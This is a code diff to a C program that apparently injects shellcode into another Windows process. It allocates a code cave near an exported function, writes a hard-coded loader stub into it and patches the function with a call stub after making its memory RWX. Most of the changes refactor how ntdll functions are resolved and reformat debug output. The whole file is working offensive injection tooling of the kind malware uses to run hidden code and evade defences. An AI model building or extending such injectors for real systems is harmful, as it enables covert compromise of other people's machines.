@@ -37,6 +37,7 @@
 
 FARPROC NtWriteVirtualMemory = NULL;
 FARPROC NtProtectVirtualMemory = NULL;
+FARPROC NtAllocateVirtualMemory = NULL;
 
 unsigned char ldrStub[] = {
     0x58, 0x48, 0x83, 0xE8, 0x05, 0x50, 0x51, 0x52, 0x41, 0x50, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xB9,
@@ -63,51 +64,11 @@ unsigned char callStub[] = {
 };
 
 //
-// List all loaded dll in target process and finds the space above
-// the target dll. We'll be allocating buffer for loaderStub + shellcode in the empty
-// space
-//
-VOID FindDllBaseAndEmptySpace(_In_ HANDLE hProc, _Out_ PVOID* ppDllBase)
-{
-    HMODULE hMods[1024] = { 0x0 };
-    DWORD dwBytesNeeded = 0x0;
-
-    // Enumerate the loaded modules of the process
-    if (EnumProcessModules(hProc, hMods, sizeof(hMods), &dwBytesNeeded))
-    {
-        int nmbrOfMods = dwBytesNeeded / sizeof(HMODULE);
-
-		DEBUG_PRINT("\n[*]Loaded module info: \n");
-        // Print the sorted module addresses
-        for (int i = 0; i < nmbrOfMods; i++)
-        {
-            MODULEINFO mi = { 0x0 };
-            WCHAR modName[MAX_PATH] = { 0x0 };
-            GetModuleInformation(hProc, hMods[i], &mi, sizeof(mi));
-            GetModuleBaseName(hProc, hMods[i], modName, MAX_PATH);
-
-			if (0 == _wcsicmp(modName, TARGET_DLL))
-			{
-				*ppDllBase = mi.lpBaseOfDll;
-#ifndef _DBG
-				break;
-#endif
-			}
-
-			DEBUG_PRINT("\t0x%p <<<<<<<<< %ws\n", mi.lpBaseOfDll, modName);
-        }
-    }
-}
-
-//
 // Allocate buffer in the empty space, make sure the buffer address is
 // close to the 'call near, relative' instruction (0xe8)
 //
-BOOL FindCodeCave(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ DWORD64 dwDllSpace, _In_ SIZE_T sShellcode, _In_ _Out_ PVOID* ppCodeCave)
+BOOL FindCodeCave(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ DWORD64 dwDllSpace, _In_ SIZE_T sShellcode, _Out_ PVOID* ppCodeCave)
 {
-    FARPROC NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
-    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of 'NtAllocateVirtualMemory'\n", NtAllocateVirtualMemory);
-
     NTSTATUS status = 0x0;
 
     // make sure the code cave is within 2GB range of target function
@@ -133,7 +94,7 @@ VOID GenerateLoaderStub(_In_ PVOID originalBytes, _In_ SIZE_T sOriginalBytes)
 {
     *(UINT_PTR*)(ldrStub + 18) = *(PUCHAR*)originalBytes;
 #ifdef _DBG
-    DEBUG_PRINT("\n\n[*]Generated loader stub:\n\t");
+    DEBUG_PRINT("\n\n\tGenerated loader stub:\n\t");
     for (DWORD i = 0; i < sizeof(ldrStub); i++)
         DEBUG_PRINT("%.2X ", ldrStub[i]);
     DEBUG_PRINT("\n\n");
@@ -148,7 +109,7 @@ BOOL PatchExportedFunc(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ PVOID pRelLd
     *(UINT_PTR*)(callStub + 1) = CONV(pRelLdrAddr) & 0xFFFFFFFF;
 
 #ifdef _DBG
-    DEBUG_PRINT("\n\t[*]Generated call stub:\n\t\t");
+    DEBUG_PRINT("\n\tGenerated call stub:\n\t\t");
     for (DWORD i = 0; i < sizeof(callStub); i++)
     {
         DEBUG_PRINT("%.2X ", callStub[i]);
@@ -156,7 +117,7 @@ BOOL PatchExportedFunc(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ PVOID pRelLd
     DEBUG_PRINT("\n");
 #endif
 
-    DEBUG_PRINT("\t[*]Patching target function ...");
+    DEBUG_PRINT("\tPatching target function ...");
     DWORD dwBytesWritten = 0x0;
     NTSTATUS status = 0x0;
 
@@ -167,7 +128,7 @@ BOOL PatchExportedFunc(_In_ HANDLE hProc, _In_ PVOID pExpAddr, _In_ PVOID pRelLd
     }
 
     DEBUG_PRINT(" Done... %d bytes of call stub written to target function @ >>>>>>>>> 0x%p...\n", dwBytesWritten, pExpAddr);
-    DEBUG_PRINT("\t[*]Press <Enter> to continue ...");
+    DEBUG_PRINT("\n[*]Press <Enter> to continue ...");
     _INT;
 }
 
@@ -215,7 +176,6 @@ int main(int argc, char** argv)
 
     HANDLE hProc = INVALID_HANDLE_VALUE;
     PVOID pCodeCaveAddr = NULL;
-    PVOID pDllBase = NULL;
     PVOID pExpAddr = NULL;
     PVOID pRelLdrAddr = NULL;
     PVOID pOriginalInstBytesBuf = NULL;
@@ -234,9 +194,11 @@ int main(int argc, char** argv)
     // TODO: syscall
     NtWriteVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtWriteVirtualMemory");
     NtProtectVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtProtectVirtualMemory");
+    NtAllocateVirtualMemory = GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtAllocateVirtualMemory");
 
     DEBUG_PRINT("\n[*]Nt function address:");
-    DEBUG_PRINT("\n\t0x%p <<<<<<<<< Address of 'NtWriteVirtualMemory'\n", NtWriteVirtualMemory);
+    DEBUG_PRINT("\n\t0x%p <<<<<<<<< Address of 'NtAllocateVirtualMemory'\n", NtAllocateVirtualMemory);
+    DEBUG_PRINT("\t0x%p <<<<<<<<< Address of 'NtWriteVirtualMemory'\n", NtWriteVirtualMemory);
     DEBUG_PRINT("\t0x%p <<<<<<<<< Address of 'NtProtectVirtualMemory'\n", NtProtectVirtualMemory);
 
     dwProcId = atoi(argv[1]);
@@ -247,17 +209,7 @@ int main(int argc, char** argv)
         goto _exit;
     }
 
-    FindDllBaseAndEmptySpace(hProc, &pDllBase);
-
     DEBUG_PRINT("\n[*]Payload memory info: \n");
-
-    if (NULL == pDllBase)
-    {
-        DEBUG_PRINT("[-]Failed to resolve Dll base for %ws", TARGET_DLL);
-        goto _exit;
-    }
-
-	DEBUG_PRINT("\t0x%p <<<<<<<<< Base Address of '%ws'\n", pDllBase, TARGET_DLL);
 
     // TODO: hash
     pExpAddr = GetProcAddress(GetModuleHandleW(TARGET_DLL), TARGET_EXP_FUNC);
@@ -291,7 +243,7 @@ int main(int argc, char** argv)
     }
 
 #ifdef _DBG
-    DEBUG_PRINT("\n[*]%d bytes read from target function '%s':\n\t", sBytesRead, TARGET_EXP_FUNC);
+    DEBUG_PRINT("\n\t%d bytes read from target function '%s':\n\t", sBytesRead, TARGET_EXP_FUNC);
     for (WORD i = 0; i < sBytesRead; i++)
         DEBUG_PRINT("0x%.2X ", ((PUCHAR)pOriginalInstBytesBuf)[i]);
 #endif
@@ -322,14 +274,14 @@ int main(int argc, char** argv)
     if (0x0 != (status = NtProtectVirtualMemory(hProc, &pCodeCaveAddr, &sLdrStub, PAGE_EXECUTE_READ, &dwOldProtect)))
         DEBUG_PRINT("[-]Failed to change memory protection for code cave with error: 0x%.8x\n", GetLastError());
 
-    DEBUG_PRINT("Done ... %d bytes of loader stub written ...\n", dwBytesWritten);
+    DEBUG_PRINT("\tDone ... %d bytes of loader stub written ...\n\n", dwBytesWritten);
     
     DEBUG_PRINT("[*]Patch target function '%s'\n", TARGET_EXP_FUNC);
     // calculate relative address of loader stub, accounting the 5-byte call opcode
     pRelLdrAddr = (PVOID)(CONV(pCodeCaveAddr) - (CONV(pExpAddr) + 5));
     DEBUG_PRINT("\t0x%p <<<<<<<<< Relative loader address\n", pRelLdrAddr);
 
-    DEBUG_PRINT("\t[*]Change target function memory protection to RWX ...");
+    DEBUG_PRINT("\tChange target function memory protection to RWX ...");
     
     PVOID pTmpExpAddr = pExpAddr;
     if (0x0 != (status = NtProtectVirtualMemory(hProc, &pTmpExpAddr, &sCallStub, PAGE_EXECUTE_READWRITE, &dwOldProtect)))
@@ -357,3 +309,4 @@ _exit:
 
     return 0;
 }
+
